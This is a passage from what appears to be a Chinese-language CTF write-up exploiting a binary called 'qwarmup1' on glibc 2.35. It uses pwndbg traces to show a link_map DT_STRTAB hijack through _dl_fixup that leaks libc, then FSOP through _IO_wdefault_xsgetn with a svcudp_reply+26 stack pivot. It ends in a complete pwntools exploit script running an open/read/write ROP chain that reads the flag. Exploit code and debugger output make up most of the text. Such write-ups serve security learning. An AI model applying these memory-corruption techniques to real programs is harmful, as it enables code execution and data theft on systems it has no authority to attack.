<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <code>l-&gt;l_addr + reloc-&gt;r_offset</code> 公式来计算 <code>write@got</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf64_Rela &lt;<span class="number">4018</span>h, <span class="number">300000007</span>h, <span class="number">0</span>&gt;       ; R_X86_64_JUMP_SLOT write</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: hex(<span class="number">0x556d291fe070</span>+<span class="number">0x4018</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">&#x27;0x556d29202088&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>_dl_fixup_</code> 执行完毕以后，就会根据错误的 <code>link_map-&gt;l_addr</code> 来把错误的地址给改为 <code>write</code> 的真实地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x000f000000000000</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x00007f9e9d89da20</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x556d29202088</span> —▸ <span class="number">0x7f9e9d89da20</span> (write) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以发现 <code>bss-&gt;size</code> &lt; 0x10000，程序循环</li>
</ul>
<p>程序循环了，我们可以在 libc 中写入任意数据，不过我们想要泄露 libc_base 需要用到 <code>_dl_fixup_</code> 的机制：</p>
<ul>
<li>由于 write 的函数地址没有成功回填到 GOT 表，后面每次调用还会走 symbol 查找流程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); <span class="comment">// DT_STRTAB id=5</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_dl_lookup_symbol_x</code> 函数的第一个参数就是待查找函数的函数名，而 <code>sym-&gt;st_name</code> 对于同一个函数而言是一个固定值（“write” = 34） </li>
<li>而 <code>strtab</code> 则是来源于于 libc 上的全局结构体 <code>link_map</code>，那么可以劫持 <code>link_map-&gt;l_info[DT_STRTAB]</code> ，使其指向可控内存段（比如说：<code>link_map-&gt;l_info[DT_DEBUG]</code>），达到任意函数调用</li>
</ul>
<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址，可以通过改写最低位：</p>
<ul>
<li>把 <code>link_map-&gt;l_info[DT_DEBUG]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_STRTAB]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
<li>于是我们提前在 <code>DT_DEBUG+34</code>（原来是 <code>DT_STRTAB+34</code>）的位置写上 <code>[function_name]</code>，就可以达到任意函数调用</li>
</ul>
<p>我们可以利用这个机制来 leak libc_base，示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>))</span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) </span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<ul>
<li>思路还是和上面的一样，只是执行的函数为 <code>_IO_flush_all</code></li>
<li>于是我们在 <code>_IO_2_1_stdout_</code> 中修改 FILE 结构体的条目，经过如下调用链后泄露 libc_base：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup -&gt; _dl_lookup_symbol_x -&gt; _IO_flush_all</span><br></pre></td></tr></table></figure>
<p>最后用同样的方法执行 FSOP，使用 <code>_IO_wdefault_xsgetn</code> 的调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; _IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi+0x48)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x1</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先还原 <code>DT_STRTAB</code></li>
<li>修改 <code>_IO_2_1_stdout_ FILE</code> 结构体，利用 vtable 偏移的思想实现 vtable 任意函数调用（<code>_IO_flush_all_lockp</code> 原本会调用 <code>_IO_wstrn_overflow</code> ，修改 vtable 偏移后变为调用 <code>_IO_wdefault_xsgetn</code>）</li>
<li>然后在 <code>_IO_wide_data_1</code> 中伪造数据：<ul>
<li><code>_IO_wide_data_1+0x20</code> -&gt; [RDX]</li>
<li><code>_IO_wide_data_1+0xe0</code> -&gt; [RAX]</li>
</ul>
</li>
<li>我们可以控制 [RAX]，并且在 [RAX+0x18] 中提前写入 ROP 的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x7f8099bc0108</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"> RDI  <span class="number">0x7f8099ece780</span> (_IO_2_1_stdout_) ◂— <span class="number">0x800</span></span><br><span class="line"> RDX  <span class="number">0x1</span></span><br><span class="line">*RIP  <span class="number">0x7f8099d37d55</span> (_IO_switch_to_wget_mode+<span class="number">37</span>) ◂— call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8099bc0108</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8099bc0120</span> —▸ <span class="number">0x7f8099e1e1fa</span> (svcudp_reply+<span class="number">26</span>) ◂— mov    rbp, qword ptr [rdi + <span class="number">0x48</span>] <span class="comment">/* ROP */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gadget svcudp_reply 可以控制会 [RBP] 为 [RDI+0x48]（我们提前在 <code>_IO_2_1_stdout_ +0x48</code> 中伪造好 ROP_addr），同时会 call [RAX+0x28]，在这里放入 <code>leave ret</code> 就利用控制栈了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./qwarmup1&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory /home/yhellow/tools/debuglibc/2.35-0ubuntu3_amd64/usr/lib/debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14A7)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14D1)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14BB)\n&quot;</span></span><br><span class="line"></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./qwarmup1&quot;</span>,cmd)</span><br><span class="line"><span class="comment">#p = process(&quot;./qwarmup1&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1491)\n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span>-<span class="number">0x10</span></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>])) <span class="comment"># overwrite &amp;size-4 = write@libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>)) <span class="comment"># _flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) <span class="comment"># DT_STRTAB+34 = write =&gt; DT_DEBUG+34 = call_func</span></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x2</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">svcudp_reply26 = libc.address + <span class="number">0x16a1fa</span></span><br><span class="line">pop_r12_r13_r14_ret = libc.address + <span class="number">0x000000000002be4c</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc.address + <span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret = libc.address + <span class="number">0x0000000000045eb0</span></span><br><span class="line">leave_ret = libc.address + <span class="number">0x00000000000562ec</span></span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall_ret = libc.address + <span class="number">0x91396</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<ul>
<li>复习了一下 <code>_dl_runtime_resolve</code> 的知识</li>
<li>也认识了一个可以控制栈的 gadget（svcudp_reply+26）</li>
</ul>
